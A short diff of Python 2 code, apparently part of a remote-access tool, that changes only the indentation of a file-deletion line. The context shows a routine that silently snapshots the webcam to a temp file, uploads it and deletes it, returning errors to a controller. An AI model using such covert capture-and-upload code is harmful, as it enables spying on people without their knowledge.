@@ -13,7 +13,7 @@ def run():
         filepath = os.path.join(os.environ['temp'], filename)
         cam.saveSnapshot(filepath)
         upload.run(filepath)
-		os.remove(filepath)
+        os.remove(filepath)
     except Exception, exc:
         utils.send_output(exc)
             
